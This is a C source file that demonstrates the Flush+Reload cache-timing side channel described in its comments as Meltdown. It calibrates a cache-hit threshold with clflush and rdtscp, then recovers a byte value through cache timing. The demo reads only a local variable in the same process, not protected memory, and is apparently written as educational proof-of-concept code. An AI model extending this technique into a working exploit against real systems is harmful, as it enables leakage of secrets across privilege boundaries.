#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <emmintrin.h>
#include <x86intrin.h>
#include <math.h>


// this is set to be a global variable, because if it was passed between functions, the first element (and
// therefore the first block) of the array would likely be cached
char meltdownArray[256*4096];

#define OFFSET 1024

// comparison funciton for qsort
int cmpfunc(const void *a, const void *b){
    return(*(int*)a - *(int*)b);
}

// finds the gap that best defines the difference between cached 
// and un-cached access times
int findGap(int array[], int size){
    double gap;
    double searchGapRatio = 1.75; // I found this to be ideal through testing.
    
    // finds ratios between every group of 2 numbers
    // nothing that was flushed will be cached, but some things thought on the cache may accidentally get flushed
    // so we search only the first half of the array, starting from the midpoint.
    for (int i = size/2 - 1; i >= 0; i--){
        if (array[i] != 0) {
            gap = (double)array[i+1] / (double)array[i];
        }
        if (gap >= searchGapRatio) return i;
    }

    // default return value will be the midpoint of the array
    return size/2;
}


int getCacheAccessTime(){
    int testArraySize = 8; // the smaller this is, the more pronounced the gap difference tends to be
    char testArray[testArraySize*4096];
    int placeholder = 0;
    register uint64_t startTime, totalTime;
    char *addr;
    int timeArray[testArraySize];
    int gapIndex;

    // initializes array so that all indexes have data
    for (int i = 0; i < testArraySize; i++) testArray[i*4096 + OFFSET] = 1;
    
    // removes entire array from cache
    for (int i = 0; i < testArraySize; i++) _mm_clflush(&testArray[i*4096 + OFFSET]);
    
    // re-declares values for first half of array, to bring them to cache, and test
    // them immediately after they're declared
    for (int i = 0; i < testArraySize/2; i++) testArray[i*4096 + OFFSET] = 2;

    // times how long it takes to access each item
    for (int i = 0; i < testArraySize; i++){
        addr = &testArray[i*4096 + OFFSET];
        startTime = __rdtscp(&placeholder);
        placeholder = *addr;
        totalTime = __rdtscp(&placeholder) - startTime;
        timeArray[i] = (int)totalTime;
    }

    // sorts the array
    qsort(timeArray, (size_t)testArraySize, sizeof(int), cmpfunc);
    /*for (int i = 0; i < testArraySize; i++){
        printf("%i\n", timeArray[i]);
    }*/
    // find the gap in the array of times that represents 
    // the threshold between cached and uncached data
    gapIndex = findGap(timeArray, testArraySize);
    
    // return the midpoint of said gap
    return (int)(timeArray[gapIndex]/2 + timeArray[gapIndex+1]/2);

}

// this function will have priveleged access, and will be planted by the same person who made the reload function.
void flush(){
    for (int i = 0; i < 256; i++) _mm_clflush(&meltdownArray[i*4096 + OFFSET]);
}

void sender(unsigned char *privelegedMemory){
    // this is meltdown. the first line would throw an error if it was actual protected memory, 
    // but the following line will run anyway due to out-of-order execution.
    unsigned char privelegedValue = *privelegedMemory;
    meltdownArray[privelegedValue*4096 + OFFSET] = 1;
    // You would think no other function should be able to tell that privelegedvalue's block was accessed, since in memory nothing changed.
    // However, simply accessing this value will almost certainly bring it to the cache, and the reload function will be able to figure out which block it is.
}

int reload(int threshold){
    char *addr;
    int placeholder = 0;
    register uint64_t startTime, totalTime;

    for (int i = 0; i < 256; i++){
        addr = &meltdownArray[i*4096 + OFFSET];
        startTime = __rdtscp(&placeholder);
        placeholder = *addr;
        totalTime = __rdtscp(&placeholder) - startTime;
        if ((int)totalTime < threshold) return i; // i will be the priveleged value we should not have been able to obtain
    }
    return -1;
}


int main(int argc, char **argv){
    int cacheAccessTime = getCacheAccessTime();
    printf("%i\n", cacheAccessTime);
    unsigned char privelegedValue = 254;


    // initializing the array
    for (int i = 0; i < 256; i++) meltdownArray[i*4096 + OFFSET] = 1;
    

    // a demonstration of basic flush + reload
    flush();
    sender(&privelegedValue); // this can also be called the "victim" function
    int secretValue = reload(cacheAccessTime); // this can also be called the reciever function

    if (secretValue == -1) printf("no secret value was found this run");
    else printf("the secret value is %i", secretValue);
}